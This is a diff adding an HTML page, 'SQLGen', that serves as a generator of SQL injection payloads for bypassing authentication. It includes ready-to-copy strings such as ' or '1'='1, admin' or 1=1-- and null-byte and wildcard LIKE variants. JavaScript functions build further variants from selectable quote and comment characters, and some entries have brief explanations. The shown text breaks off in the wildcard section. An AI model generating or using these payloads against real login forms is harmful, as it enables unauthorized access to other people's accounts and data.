@@ -1,0 +1,1799 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <title>SQLGen</title>
+  <link rel="shortcut icon" href="https://fedwig.pages.dev/notion/38caf215-7cd7-4adc-9b63-11d58130f724/Fedwig.png" />
+  <link rel="stylesheet" type="text/css" href="./css/styles.css" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"
+    type="text/css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw=="
+    crossorigin="anonymous" referrerpolicy="no-referrer" />
+  <script src="./js/queries.js"></script>
+</head>
+
+<body data-theme="light">
+  <div class="text-center">
+    <!-- header -->
+    <div class="top light">
+      <!-- github icon -->
+      <a href="https://github.com/fedwig/" class="github-corner" aria-label="View source on GitHub">
+        <svg width="80" height="80" viewBox="0 0 250 250" id="Github-Cat">
+          <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+          <path
+            d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+            fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+          <path
+            d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+            fill="currentColor" class="octo-body"></path>
+        </svg>
+      </a>
+      <!-- github icon end -->
+
+      <!-- Dark/Light Mode -->
+      <div>
+        <button class="fa-solid dark-mode-button" id="Switch-Color"> 🌙 Dark Mode</button>
+      </div>
+      <!-- Dark/Light Mode end -->
+
+      <h1>SQL Injection Query Templates</h1>
+
+      <div class="body">
+        <!-- Tab links -->
+        <div class="tab">
+          <button class="tablinks" onclick="ChangeTab(event, 'Authentication-Bypass')" id="AuthenticationBypassOpen">
+            Authentication Bypass </button>
+          <button class="tablinks" onclick="ChangeTab(event, 'Union-Injections')" id="UnionInjectionOpen"> Union
+            Injections </button>
+        </div>
+        <!--Tab links end -->
+
+
+        <!-- Authentication Bypass -->
+        <div id="Authentication-Bypass" class="tabcontent">
+          <h3>Authentication Bypass</h3>
+          <div class="tabs-container">
+            <div class="tabs scroll">
+              <div class="tab active">Always True Auth</div>
+              <div class="tab">Empty String Auth</div>
+              <div class="tab">Admin Auth</div>
+              <div class="tab">Null Byte Auth</div>
+              <div class="tab">Comment Auth</div>
+              <div class="tab">Char/String Auth</div>
+              <div class="tab">Char True Auth</div>
+              <div class="tab">Char True Auth 2</div>
+              <div class="tab">Number Auth</div>
+              <div class="tab">True Condition Auth</div>
+              <div class="tab">False Admin Auth</div>
+              <div class="tab">Admin Auth 2</div>
+              <div class="tab">Always True Auth 2</div>
+              <div class="tab">Wildcard UID Injection</div>
+              <div class="tab">Wildcard Uname Injection</div>
+              <div class="tab">Wildcard Userid Injection</div>
+              <div class="tab">Wildcard User Injection</div>
+              <div class="tab">Custom Wildcard Injection</div>
+
+            </div>
+
+            <div class="content-container">
+              <div class="content active">
+                <h3>Always True Auth</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Bypass-Query-1" value="' or '1'='1"
+                      readonly />
+                    <label for="Bypass-Query-1">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Bypass-Query-1">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>' : </strong>The initial single quote closes the string that was started by the query
+                    itself.</br></br>
+                    <strong> or : </strong>This introduces a logical OR condition, meaning that if either the condition
+                    before or after the OR is true, the overall condition will be considered true.</br></br>
+                    <strong>'1'='1' : </strong>This condition is always true, because it compares the string '1' to
+                    itself.
+                  </p>
+                </div>
+              </div>
+              <div class="content">
+                <h3>Empty String Auth</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Bypass-Query-2" value="' or ''='" readonly />
+                    <label for="Bypass-Query-2">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Bypass-Query-2">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>' : </strong>The initial single quote closes the string that was started by the query
+                    itself.</br></br>
+                    <strong>or : </strong>This introduces a logical OR condition, meaning that if either the condition
+                    before or after the OR is true, the overall condition will be considered true.</br></br>
+                    <strong>'1'='1' : </strong>This condition is always true, because it compares the string '1' to
+                    itself.
+                </div>
+              </div>
+
+              <div class="content">
+                <h3>Admin Auth</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Admin-Auth-Query" value="admin' or '"
+                      readonly />
+                    <label for="Admin-Auth-Query">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Admin-Auth-Query">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="row mt-3">
+                  <div class="col">
+                    <div class="input-group">
+                      <label for="AdminAuth-Quote-Choice" class="input-group-text">Quote Type:</label>
+                      <select id="AdminAuth-Quote-Choice" class="form-control">
+                        <option value="'">Single Quote (')</option>
+                        <option value='"'>Double Quote (")</option>
+                      </select>
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group">
+                      <label for="AdminAuth-Comment-Choice" class="input-group-text">Comment Type:</label>
+                      <select id="AdminAuth-Comment-Choice" class="form-control">
+                        <option value="">No Comment</option>
+                        <option value="--">Double Dash (--)</option>
+                        <option value="#">Hash (#)</option>
+                        <option value="/*">Slash Asterisk (/*)</option>
+                      </select>
+                    </div>
+                  </div>
+                </div>
+                <div>
+                  </br>
+                  <button class="back-button" type="button" onclick="generateAdminAuth()">Generate Query</button>
+                </div>
+                <div class="explanation mt-3">
+                  <p>Select the desired quote type and comment type to dynamically generate the "Admin Auth" query
+                    template based on your preferences.</p>
+                </div>
+              </div>
+
+              <script>
+                function generateAdminAuth() {
+                  var quoteChoice = document.getElementById('AdminAuth-Quote-Choice').value;
+                  var commentChoice = document.getElementById('AdminAuth-Comment-Choice').value;
+
+                  // Constructing the query
+                  var query = `admin${quoteChoice}or${quoteChoice}${commentChoice}`;
+
+                  document.getElementById('Admin-Auth-Query').value = query;
+                }
+              </script>
+
+
+              <div class="content">
+                <h3>Null Byte Auth</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Bypass-Query-4" value="' or 1]%00" readonly />
+                    <label for="Bypass-Query-4">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Bypass-Query-4">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>' :</strong> The initial single quote closes the string that might represent a username or
+                    identifier in the query.</br></br>
+                    <strong>or :</strong> This introduces a logical OR condition, which means that if either the
+                    condition before or after the OR is true, the overall condition will be considered true.</br></br>
+                    <strong>1] :</strong> This is a malformed condition that may attempt to bypass input validation or
+                    filtering mechanisms.</br></br>
+                    <strong>%00 :</strong> This is a null byte (%00) or a null terminator. It can be used to terminate
+                    the string in the SQL query, effectively ignoring any characters that may follow it.
+                  </p>
+                </div>
+              </div>
+
+              <div class="content">
+                <h3>Comment Auth</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Comment-Auth-Query" value="' or /* or '"
+                      readonly />
+                    <label for="Comment-Auth-Query">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy"
+                      data-id="Comment-Auth-Query">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="row mt-3">
+                  <div class="col">
+                    <div class="input-group">
+                      <label for="Comment-Auth-Comment-Choice" class="input-group-text">Comment Type:</label>
+                      <select id="Comment-Auth-Comment-Choice" class="form-control">
+                        <option value="/*">Slash Asterisk (/*)</option>
+                        <option value="--">Double Dash (--)</option>
+                        <option value="#">Hash (#)</option>
+                        <option value="">No Comment</option>
+                      </select>
+                    </div>
+                  </div>
+                </div>
+                <div>
+                  </br>
+                  <button class="back-button type=" button" onclick="generateCommentAuth()">Generate
+                    Query</button>
+                </div>
+                <div class="explanation">
+                  <p>Select the desired comment type to dynamically generate the "Comment Auth" query template based on
+                    your preferences.</p>
+                </div>
+              </div>
+
+              <script>
+                function generateCommentAuth() {
+                  var commentChoice = document.getElementById('Comment-Auth-Comment-Choice').value;
+
+                  var query = `' or ${commentChoice} or '`;
+
+                  if (commentChoice === '') {
+                    query = `' or ${commentChoice}`;
+                  }
+
+                  document.getElementById('Comment-Auth-Query').value = query;
+
+                  // Optional: Automatically copy the generated query to clipboard
+                  navigator.clipboard.writeText(query).then(() => {
+                    console.log("Query copied to clipboard successfully.");
+                  }, (err) => {
+                    console.error("Failed to copy query to clipboard: ", err);
+                  });
+                }
+
+              </script>
+
+              <div class="content">
+                <h3>Char/String Auth</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Char-Auth-Query"
+                      value="' or &quot;a&quot; or '" readonly />
+                    <label for="Char-Auth-Query">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Char-Auth-Query">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="row mt-3">
+                  <div class="col">
+                    <div class="input-group">
+                      <label for="Char-Value" class="input-group-text">Enter Character/String:</label>
+                      <input type="text" id="Char-Value" class="form-control" placeholder="e.g., a">
+                    </div>
+                  </div>
+                </div>
+                <div>
+                  <button class="back-button" type="button" onclick="generateCharAuth()">Generate Query</button>
+                </div>
+                <div class="explanation mt-3">
+                  <p><strong>' :</strong> The initial single quote closes the string that might represent a username or
+                    identifier in the query.</br></br>
+                    <strong>or : </strong> This introduces a logical OR condition, which means that if either the
+                    condition before or after the OR is true, the overall condition will be considered true.</br></br>
+                    <strong>User Input : </strong> Represents the character or string input by the user for comparison,
+                    which can lead to unexpected behavior in the query.</br></br>
+                    <strong>or : </strong> This introduces another logical OR condition, extending the possibilities for
+                    the query to evaluate true conditions.</br></br>
+                    <strong>' :</strong> The final single quote closes the string, completing the injection attempt.
+                  </p>
+                </div>
+              </div>
+
+              <script>
+                function generateCharAuth() {
+                  var charValue = document.getElementById('Char-Value').value;
+                  // Ensuring the character/string is properly enclosed in quotes for the SQL query
+                  var query = `\' or \"${charValue}\" or \'`;
+
+                  document.getElementById('Char-Auth-Query').value = query;
+
+                  // Optional: Automatically copy the generated query to clipboard
+                  navigator.clipboard.writeText(query).then(() => {
+                    console.log("Query copied to clipboard successfully.");
+                  }, (err) => {
+                    console.error("Failed to copy query to clipboard: ", err);
+                  });
+                }
+
+              </script>
+
+              <div class="content">
+                <h3>Char True Auth</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Char-True-Auth-Query" value="' or 'x'='x'"
+                      readonly />
+                    <label for="Char-True-Auth-Query">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy"
+                      data-id="Char-True-Auth-Query">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="row mt-3">
+                  <div class="col">
+                    <div class="input-group">
+                      <label for="CharTrue-Quote-Choice" class="input-group-text">Quote Type:</label>
+                      <select id="CharTrue-Quote-Choice" class="form-control">
+                        <option value="'">Single Quote (')</option>
+                        <option value='"'>Double Quote (")</option>
+                      </select>
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group">
+                      <label for="CharTrue-Comment-Choice" class="input-group-text">Comment Type:</label>
+                      <select id="CharTrue-Comment-Choice" class="form-control">
+                        <option value="">No Comment</option>
+                        <option value="--">Double Dash (--)</option>
+                        <option value="#">Hash (#)</option>
+                        <option value="/*">Slash Asterisk (/*)</option>
+                      </select>
+                    </div>
+                  </div>
+                </div>
+                <div>
+                  </br>
+                  <button class="back-button" type="button" onclick="generateCharTrueAuth()">Generate Query</button>
+                </div>
+                <div class="explanation mt-3">
+                  <p>Select the desired quote type and comment type to dynamically generate the "Char True Auth" query
+                    template based on your preferences.</p>
+                </div>
+              </div>
+
+              <script>
+                function generateCharTrueAuth() {
+                  var quoteChoice = document.getElementById('CharTrue-Quote-Choice').value;
+                  var commentChoice = document.getElementById('CharTrue-Comment-Choice').value;
+
+                  // Constructing the query with selected quote and comment types
+                  var query = `' or ${quoteChoice}x${quoteChoice}=${quoteChoice}x${quoteChoice}${commentChoice}`;
+
+                  document.getElementById('Char-True-Auth-Query').value = query;
+                }
+
+              </script>
+
+              <div class="content">
+                <h3>Char True Auth 2</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Char-True-Auth-2-Query"
+                      value="')) or (('x'))=(('x'" readonly />
+                    <label for="Char-True-Auth-2-Query">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy"
+                      data-id="Char-True-Auth-2-Query">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="row mt-3">
+                  <div class="col">
+                    <div class="input-group">
+                      <label for="CharTrue2-Char-Choice" class="input-group-text">Character:</label>
+                      <input type="text" id="CharTrue2-Char-Choice" class="form-control" placeholder="e.g., x"
+                        value="x">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group">
+                      <label for="CharTrue2-Quote-Choice" class="input-group-text">Quote Type:</label>
+                      <select id="CharTrue2-Quote-Choice" class="form-control">
+                        <option value="'">Single Quote (')</option>
+                        <option value='"'>Double Quote (")</option>
+                      </select>
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group">
+                      <label for="CharTrue2-Comment-Choice" class="input-group-text">Comment Type:</label>
+                      <select id="CharTrue2-Comment-Choice" class="form-control">
+                        <option value="">No Comment</option>
+                        <option value="--">Double Dash (--)</option>
+                        <option value="#">Hash (#)</option>
+                        <option value="/*">Slash Asterisk (/*)</option>
+                      </select>
+                    </div>
+                  </div>
+                </div>
+                <div>
+                  <button class="back-button" type="button" onclick="generateCharTrueAuth2()">Generate Query</button>
+                </div>
+                <div class="explanation mt-3">
+                  <p>Select the character, desired quote type, and comment type to dynamically generate the "Char True
+                    Auth 2" query template based on your preferences.</p>
+                </div>
+              </div>
+
+              <script>
+                function generateCharTrueAuth2() {
+                  var character = document.getElementById('CharTrue2-Char-Choice').value;
+                  var quoteChoice = document.getElementById('CharTrue2-Quote-Choice').value;
+                  var commentChoice = document.getElementById('CharTrue2-Comment-Choice').value;
+
+                  // Constructing the query with selected character, quote, and comment types
+                  // Note: The outermost single quotes in the value are part of the SQL syntax and not affected by the quoteChoice
+                  var query = `${quoteChoice}) or ((${quoteChoice}${character}${quoteChoice}))=((${quoteChoice}${character}${quoteChoice}`;
+
+                  // Append the comment part to the query, if any
+                  query += `${commentChoice}`;
+
+                  document.getElementById('Char-True-Auth-2-Query').value = query;
+                }
+
+              </script>
+
+
+              <div class="content">
+                <h3>Number Auth</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Number-Auth-Query" value="' or 1 or '"
+                      readonly />
+                    <label for="Number-Auth-Query">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Number-Auth-Query">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="row mt-3">
+                  <div class="col">
+                    <div class="input-group">
+                      <label for="NumberAuth-Quote-Choice" class="input-group-text">Quote Type:</label>
+                      <select id="NumberAuth-Quote-Choice" class="form-control">
+                        <option value="'">Single Quote (')</option>
+                        <option value='"'>Double Quote (")</option>
+                        <option value="">No Quotes</option>
+                      </select>
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group">
+                      <label for="NumberAuth-Comment-Choice" class="input-group-text">Comment Type:</label>
+                      <select id="NumberAuth-Comment-Choice" class="form-control">
+                        <option value="">No Comment</option>
+                        <option value="--">Double Dash (--)</option>
+                        <option value="#">Hash (#)</option>
+                        <option value="/*">Slash Asterisk (/*)</option>
+                      </select>
+                    </div>
+                  </div>
+                </div>
+                <div>
+                  </br>
+                  <button class="back-button" type="button" onclick="generateNumberAuth()">Generate
+                    Query</button>
+                </div>
+                <div class="explanation mt-3">
+                  <p>Select the desired quote type and comment type to dynamically generate the "Number Auth" query
+                    template based on your preferences.</p>
+                </div>
+              </div>
+
+              <script>
+                function generateNumberAuth() {
+                  var quoteChoice = document.getElementById('NumberAuth-Quote-Choice').value;
+                  var commentChoice = document.getElementById('NumberAuth-Comment-Choice').value;
+
+                  // Constructing the query
+                  var query = `${quoteChoice}or 1 or ${quoteChoice}${commentChoice}`;
+                  document.getElementById('Number-Auth-Query').value = query;
+                }
+
+              </script>
+
+
+              <div class="content">
+                <h3>True Condition Auth</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="True-Condition-Auth-Query" value="' or true--"
+                      readonly />
+                    <label for="True-Condition-Auth-Query">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy"
+                      data-id="True-Condition-Auth-Query">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="row mt-3">
+                  <div class="col">
+                    <div class="input-group">
+                      <label for="TrueCondition-Quote-Choice" class="input-group-text">Quote Type:</label>
+                      <select id="TrueCondition-Quote-Choice" class="form-control">
+                        <option value="'">Single Quote (')</option>
+                        <option value='"'>Double Quote (")</option>
+                        <option value="">No Quotes</option>
+                      </select>
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group">
+                      <label for="TrueCondition-Comment-Choice" class="input-group-text">Comment Type:</label>
+                      <select id="TrueCondition-Comment-Choice" class="form-control">
+                        <option value="">No Comment</option>
+                        <option value="--">Double Dash (--)</option>
+                        <option value="#">Hash (#)</option>
+                        <option value="/*">Slash Asterisk (/*)</option>
+                      </select>
+                    </div>
+                  </div>
+                </div>
+                <div>
+                  </br>
+                  <button class="back-button" type="button" onclick="generateTrueConditionAuth()">Generate
+                    Query</button>
+                </div>
+                <div class="explanation mt-3">
+                  <p>Select the desired quote type for the condition and comment type to dynamically generate the "True
+                    Condition Auth" query template based on your preferences.</p>
+                </div>
+              </div>
+
+              <script>
+                function generateTrueConditionAuth() {
+                  var quoteChoice = document.getElementById('TrueCondition-Quote-Choice').value;
+                  var commentChoice = document.getElementById('TrueCondition-Comment-Choice').value;
+
+                  var query = `${quoteChoice} or true ${commentChoice}`;
+
+                  document.getElementById('True-Condition-Auth-Query').value = query;
+                }
+              </script>
+
+
+              <div class="content">
+                <h3>False Admin Auth</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="False-Admin-Auth-Query"
+                      value="admin' or '1'='2" readonly />
+                    <label for="False-Admin-Auth-Query">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy"
+                      data-id="False-Admin-Auth-Query">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="row mt-3">
+                  <div class="col">
+                    <div class="input-group">
+                      <label for="FalseAdminAuth-Quote-Choice" class="input-group-text">Quote Type:</label>
+                      <select id="FalseAdminAuth-Quote-Choice" class="form-control">
+                        <option value="'">Single Quote (')</option>
+                        <option value='"'>Double Quote (")</option>
+                      </select>
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group">
+                      <label for="FalseAdminAuth-Comment-Choice" class="input-group-text">Comment Type:</label>
+                      <select id="FalseAdminAuth-Comment-Choice" class="form-control">
+                        <option value="">No Comment</option>
+                        <option value="--">Double Dash (--)</option>
+                        <option value="#">Hash (#)</option>
+                        <option value="/*">Slash Asterisk (/*)</option>
+                      </select>
+                    </div>
+                  </div>
+                </div>
+                <div>
+                  </br>
+                  <button class="back-button" type="button" onclick="generateFalseAdminAuth()">Generate Query</button>
+                </div>
+                <div class="explanation mt-3">
+                  <p>Select the desired quote type for the condition and comment type to dynamically generate the "False
+                    Admin Auth" query template based on your preferences.</p>
+                </div>
+              </div>
+
+              <script>
+                function generateFalseAdminAuth() {
+                  var quoteChoice = document.getElementById('FalseAdminAuth-Quote-Choice').value;
+                  var commentChoice = document.getElementById('FalseAdminAuth-Comment-Choice').value;
+
+                  // Constructing the query using selected quote and comment types
+                  var query = `admin${quoteChoice} or ${quoteChoice}1${quoteChoice}=${quoteChoice}2${commentChoice}`;
+
+                  document.getElementById('False-Admin-Auth-Query').value = query;
+                }
+
+              </script>
+
+
+              <div class="content">
+                <h3>Admin Auth 2</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Admin-Auth-Query-2" value="admin' or 1=1--"
+                      readonly />
+                    <label for="Admin-Auth-Query-2">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy"
+                      data-id="Admin-Auth-Query-2">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="Quote-Choice" class="input-group-text">Quote Type:</label>
+                      <select id="Quote-Choice" class="form-control">
+                        <option value="'">Single (')</option>
+                        <option value='"'>Double (")</option>
+                      </select>
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group">
+                      <label for="Comment-Choice" class="input-group-text">Comment Type:</label>
+                      <select id="Comment-Choice" class="form-control">
+                        <option value="">No Comment</option>
+                        <option value="--">--</option>
+                        <option value="#">#</option>
+                        <option value="/*">/*</option>
+                      </select>
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group">
+                      <label for="OneEqualsOne-Quote-Choice" class="input-group-text">1=1 Quote Type:</label>
+                      <select id="OneEqualsOne-Quote-Choice" class="form-control">
+                        <option value="">No Quotes</option>
+                        <option value="'">Single (')</option>
+                        <option value='"'>Double (")</option>
+                      </select>
+                    </div>
+                  </div>
+                </div>
+                <div>
+                  </br>
+                  <button class="back-button" type="button" onclick="generateAdminAuth2()">Generate
+                    Query</button>
+                </div>
+                <div class="explanation">
+                  <p>Select the desired quote type and comment type to dynamically generate the "Admin Auth 2" query
+                    template based on your preferences.</p>
+                </div>
+              </div>
+
+              <script>
+                function generateAdminAuth2() {
+                  var quoteChoice = document.getElementById('Quote-Choice').value;
+                  var oneEqualsOneQuoteChoice = document.getElementById('OneEqualsOne-Quote-Choice').value;
+                  var commentChoice = document.getElementById('Comment-Choice').value;
+
+                  // Adjust the 1=1 part according to the selected quote type
+                  var oneEqualsOnePart = oneEqualsOneQuoteChoice + '1=1' + oneEqualsOneQuoteChoice;
+
+                  var query = `admin${quoteChoice} or ${oneEqualsOnePart}${commentChoice}`;
+
+                  document.getElementById('Admin-Auth-Query-2').value = query;
+
+                  // Optional: Automatically copy the generated query to clipboard and update the copy button text
+                  navigator.clipboard.writeText(query).then(() => {
+                    let copyButton = document.querySelector("[data-id='Admin-Auth-Query-2'] .copytext");
+                    if (copyButton) {
+                      copyButton.innerHTML = "Copied!";
+                      setTimeout(() => { copyButton.innerHTML = "Copy to clipboard"; }, 2000); // Reset text after 2 seconds
+                    }
+                  });
+
+                  // Show the explanation
+                  document.querySelector('.explanation').style.display = 'block';
+                }
+
+              </script>
+
+
+              <div class="content">
+                <h3>Always True Auth 2</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Always-True-Query-2" value="'or 1=1#"
+                      readonly />
+                    <label for="Always-True-Query-2">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy"
+                      data-id="Always-True-Query-2">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="AlwaysTrue-OneEqualsOne-Quote-Choice" class="input-group-text">1=1 Quote Type:</label>
+                      <select id="AlwaysTrue-OneEqualsOne-Quote-Choice" class="form-control">
+                        <option value="">No Quotes</option>
+                        <option value="'">Single Quote (')</option>
+                        <option value='"'>Double Quote (")</option>
+                      </select>
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group mt-3">
+                      <label for="AlwaysTrue-Comment-Choice" class="input-group-text">Comment Type:</label>
+                      <select id="AlwaysTrue-Comment-Choice" class="form-control">
+                        <option value="">No Comment</option>
+                        <option value="--">Double Dash (--)</option>
+                        <option value="#">Hash (#)</option>
+                        <option value="/*">Slash Asterisk (/*)</option>
+                      </select>
+                    </div>
+                  </div>
+                </div>
+                <div>
+                  </br>
+                  <button class="back-button" type="button" onclick="generateAlwaysTrueAuth2()">Generate
+                    Query</button>
+                </div>
+                <div class="explanation">
+                  <p>Select the desired quote type for 1=1 and comment type to dynamically generate the "Always True
+                    Auth 2" query
+                    template based on your preferences.</p>
+                </div>
+              </div>
+              <script>
+                function generateAlwaysTrueAuth2() {
+                  var oneEqualsOneQuoteChoice = document.getElementById('AlwaysTrue-OneEqualsOne-Quote-Choice').value;
+                  var commentChoice = document.getElementById('AlwaysTrue-Comment-Choice').value;
+
+                  // Adjust the 1=1 part according to the selected quote type
+                  var oneEqualsOnePart = oneEqualsOneQuoteChoice ? `${oneEqualsOneQuoteChoice}1${oneEqualsOneQuoteChoice}=${oneEqualsOneQuoteChoice}1${oneEqualsOneQuoteChoice}` : '1=1';
+
+                  var query = `'or ${oneEqualsOnePart}${commentChoice}`;
+
+                  document.getElementById('Always-True-Query-2').value = query;
+                }
+
+              </script>
+
+
+              <div class="content">
+                <h3>Wildcard UID Injection</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Bypass-Query-14" value="' or uid like '%'"
+                      readonly />
+                    <label for="Bypass-Query-14">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Bypass-Query-14">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>' :</strong> The initial single quote closes the string that might represent a username or
+                    identifier in the query.</br></br>
+                    <strong>or : </strong> This introduces a logical OR condition, which means that if either the
+                    condition before or after the OR is true, the overall condition will be considered true.</br></br>
+                    <strong>uid like '%' :</strong> This condition is attempting to match any value in the 'uid' column
+                    because '%' is a wildcard character in SQL that matches any sequence of characters.
+                  </p>
+                </div>
+              </div>
+
+              <div class="content">
+                <h3>Wildcard Uname Injection</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Bypass-Query-15" value="' or uname like '%'"
+                      readonly />
+                    <label for="Bypass-Query-15">SQL</label>
+                  </div>
+                  <div class="copy">
+                    <button class="btn btn-outline-secondary light" type="button" id="Copy" data-id="Bypass-Query-15">
+                      <span class="copytext">Copy to clipboard</span> Copy Text </button>
+                  </div>
+                </div>
+                <div class="explanation">
+                  <p><strong>' :</strong> The initial single quote closes the string that might represent a username or
+                    identifier in the query.</br></br>
+                    <strong>or : </strong> This introduces a logical OR condition, which means that if either the
+                    condition before or after the OR is true, the overall condition will be considered true.</br></br>
+                    <strong>uname like '%' :</strong> This condition is attempting to match any value in the 'uname'
+                    column because '%' is a wildcard character in SQL that matches any sequence of characters.
+                  </p>
+                </div>
+              </div>
+
+              <div class="content">
+                <h3>Wildcard Userid Injection</h3>
+                <div class="input-group">
+                  <span class="input-group-text">Query:</span>
+                  <div class="form-floating">
+                    <input type="text" class="form-control-plaintext" id="Bypass-Query-16" value="' or userid like '%'"
+                      readonly />
